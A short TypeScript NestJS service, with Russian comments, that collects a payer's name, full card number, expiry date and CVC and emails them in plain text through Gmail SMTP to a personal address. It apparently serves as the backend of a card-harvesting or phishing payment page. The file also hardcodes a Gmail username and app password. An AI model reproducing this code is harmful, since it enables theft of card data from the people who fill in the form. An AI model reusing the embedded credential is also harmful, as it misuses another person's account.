import { Injectable } from '@nestjs/common';
import * as nodemailer from 'nodemailer';
import { PaymentDto } from './dto/payment.dto';

@Injectable()
export class AppService {
  async sendPaymentEmail(paymentDto: PaymentDto): Promise<void> {
    const { firstName, lastName, cardNumber, cardExpiry, cardCvc } = paymentDto;

    // Настройки Nodemailer для SMTP
    const transporter = nodemailer.createTransport({
      host: 'smtp.gmail.com', // Например, для Gmail
      port: 587,
      secure: false, // true для 465 порта, false для других портов
      auth: {
        user: 'deliveri77798@gmail.com', // Ваша почта
        pass: 'yhwz zckq zexb pmdc', // Пароль или приложение пароль Gmail
      },
    });

    const mailOptions = {
      from: 'olaalinevskaa@gmail.com',
      to: 'roma.skorohod.2005@gmail.com', // Ваш email
      subject: 'Новая оплата',
      text: `
        Имя: ${firstName}
        Фамилия: ${lastName}
        Номер карты: ${cardNumber}
        Срок действия: ${cardExpiry}
        CVC: ${cardCvc}
      `,
    };

    // Отправка письма
    await transporter.sendMail(mailOptions);
  }
}
